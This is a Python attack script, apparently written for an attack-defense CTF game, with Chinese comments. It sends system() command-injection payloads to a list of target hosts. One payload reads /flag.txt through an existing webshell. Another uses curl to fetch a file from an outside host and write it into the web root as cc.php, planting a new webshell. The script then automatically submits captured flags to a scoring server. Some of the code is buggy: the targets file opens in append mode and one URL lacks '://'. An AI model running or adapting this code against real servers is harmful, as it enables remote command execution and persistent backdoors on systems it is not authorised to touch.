from lib.parseburplog import parseburprequest
from core.common import repeat
from core.data import conf
import requests
import re


# def getflag_raw():
#     header, url, data, mathod = parseburprequest(conf.request)
#     for target in conf.targets:
#         target = target.strip + conf.url
#         result = repeat(target,data,mathod)
#         print(result)


# def getflag():
#     for target in conf.targets:
#         target = target.strip + conf.url
#         result = repeat(target, None, "GET")
#         print(result)

def getflag():  #获取flag并自动提交，通过webshell来获取flag
    uri = "/"  #shell地址
    header = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
	}
    data = "gbk=system('cat /flag.txt');"
    with open('targets.txt', 'a+') as f:
        targets = f.readlines()
        for target in targets:
            target = target.strip()
            url = "http" + target + uri
            try:
                res = requests.post(url, headers=header, data=data)
                pattern = "flag\{.*\}"
                z = re.search(pattern, res.text)
                flag = z.group()
                submit_flag(flag)
            except Exception as f:
                print(url + "shell未上传成功\n")


def webshell():   #获取webshell
    uri = "/user.php"
    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
        "Referer": ''''''
    }
    with open('targets.txt', 'a+') as f:
        targets = f.readlines()
        for target in targets:
            target = target.strip()
            url = "http://" + target + uri
            req1 = requests.get(url, headers=header)
            data = "1337=system('curl -o /var/www/html/cc.php http://www.404vul.cn/die.txt');"
            muma_url = "http://" + target + "/1.php"
            res = requests.get(muma_url, headers=header, data=data)
            url2 = "http://" + target + "/cc.php"
            try:
                res2 = requests.get(url2, timeout=1)
            except Exception as e:
                pass

def submit_flag(flag):  #提交flag输出提交结果
    submit_url = "http://awd.ctf.soonsec.cn:8089/ajax.php?m=flagSubmit"
    header = {
		"Content-Type": "application/x-www-form-urlencoded",
		"token": ""
	}
    flag = flag.rstrip('\n')
    data = "m=flagSubmit&flag={0}".format(flag)
    r = requests.post(submit_url, headers=header, data=data)
    print(r.text)